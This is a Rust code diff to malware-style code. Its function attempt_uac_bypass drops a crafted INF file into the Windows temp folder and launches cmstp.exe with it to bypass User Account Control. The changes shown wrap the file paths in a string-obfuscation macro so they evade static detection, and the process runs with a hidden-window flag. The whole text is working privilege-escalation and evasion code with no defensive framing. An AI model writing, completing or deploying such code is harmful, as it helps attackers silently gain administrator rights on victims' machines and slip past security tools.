@@ -47,7 +47,7 @@ pub fn attempt_uac_bypass() -> bool {
         Err(_) => return false,
     };
 
-    let temp_dir = r"C:\windows\temp";
+    let temp_dir = obfstr::obfstr!(r"C:\windows\temp").to_string();
     let random_file_name = format!("{}\\{}.inf", temp_dir, uuid::Uuid::new_v4());
     let inf_data = INF_TEMPLATE.replace("REPLACE_COMMAND_LINE", &format!("\"{}\"", exe_path));
 
@@ -59,15 +59,15 @@ pub fn attempt_uac_bypass() -> bool {
         .is_err()
     { return false; }
 
-    let binary_path = r"C:\windows\system32\cmstp.exe";
-    if !Path::new(binary_path).exists() {
+    let binary_path = obfstr::obfstr!(r"C:\windows\system32\cmstp.exe").to_string();
+    if !Path::new(&binary_path).exists() {
         let _ = std::fs::remove_file(&random_file_name);
         return false;
     }
 
     println!("[UAC] Running: {} /au {}", binary_path, random_file_name);
 
-    let mut child = match Command::new(binary_path)
+    let mut child = match Command::new(&binary_path)
         .arg("/au")
         .arg(&random_file_name)
         .creation_flags(0x08000000)
